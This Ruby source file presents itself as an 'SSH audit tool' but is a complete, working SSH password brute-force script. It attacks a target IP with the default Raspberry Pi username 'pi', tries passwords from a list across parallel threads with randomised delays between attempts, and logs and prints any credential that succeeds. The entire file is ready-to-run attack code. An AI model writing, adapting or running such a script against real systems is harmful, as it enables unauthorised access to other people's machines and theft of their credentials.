# ssh-audit-tool.rb - SSH audit tool for security testing
require 'net/ssh'
require 'parallel'
require 'socket'
require 'timeout'
require 'logger'

# Configuration parameters for the SSH brute force tool
host = '192.168.1.244' # Target IP address (replace with actual target)
port = 22 # SSH port (default is 22)
username = 'pi' # Username to attempt brute force attack
password_list = 'passwords.txt' # Path to password file
log_dir = '.log' # Directory to store logs
delay_between_attempts = 0.1 # Delay between attempts in seconds

# Logger setup to record attack attempts and results
Dir.mkdir(log_dir) unless Dir.exist?(log_dir)
log_file = File.join(log_dir, 'brute_force.log')
logger = Logger.new(log_file)

# Global termination flag for graceful thread stopping
$terminate = false

# Function to check if SSH server is reachable
def ssh_server_reachable?(host, port, logger)
  begin
    Timeout.timeout(5) do
      TCPSocket.new(host, port).close
    end
    true
  rescue Errno::ECONNREFUSED, Timeout::Error => e
    logger.error("[!] SSH server is not reachable: #{e.message}")
    false
  end
end

def ssh_brute_force(host, port, username, password_list, logger, delay_between_attempts)
  unless File.exist?(password_list)
    logger.error("[!] Password list file not found: #{password_list}")
    puts "[!] Password list file not found: #{password_list}"
    return nil
  end
  
  unless ssh_server_reachable?(host, port, logger)
    return nil
  end
  
  passwords = File.readlines(password_list).map(&:strip).reject(&:empty?)
  total_passwords = passwords.size
  found_password = nil
  
  Parallel.each_with_index(passwords, in_threads: 5) do |password, index|
    next if $terminate
    progress = ((index + 1).to_f / total_passwords * 100).round(2)
    logger.info("[*] Progress: #{progress}% (#{index + 1}/#{total_passwords})")
    logger.info("[*] Trying: #{username}:#{password}")
    
    begin
      Net::SSH.start(host, username, password: password, port: port, timeout: 5, non_interactive: true) do |_ssh|
        success_message = "[+] Success! Password found: #{password}"
        logger.info(success_message)
        puts success_message
        $terminate = true
        found_password = password
        Thread.exit # Завершаем текущий поток
      end
    rescue Net::SSH::AuthenticationFailed
      logger.info("[-] Incorrect password: #{password}")
    rescue Net::SSH::ConnectionTimeout => e
      logger.error("[!] Connection timeout: #{e.message}")
    rescue StandardError => e
      logger.error("[!] Unexpected error: #{e.message}")
    ensure
      delay = delay_between_attempts + rand(0.1..0.5)
      sleep(delay) unless $terminate
    end
  end
  
  logger.info("[-] Password not found.") unless found_password
  found_password
end

# Main execution
start_message = "=== Starting SSH audit tool ==="
puts start_message
logger.info(start_message)

# Ensure password list file exists
unless File.exist?(password_list)
  error_message = "[!] Password list file not found: #{password_list}"
  logger.error(error_message)
  puts error_message
  puts "[!] Please provide a valid password list file."
  exit(1)
end

found_password = ssh_brute_force(host, port, username, password_list, logger, delay_between_attempts)
if found_password
  success_message = "[+] Found password: #{found_password}"
  logger.info(success_message)
  puts success_message
else
  complete_message = "[-] Brute force completed unsuccessfully."
  logger.info(complete_message)
  puts complete_message
end
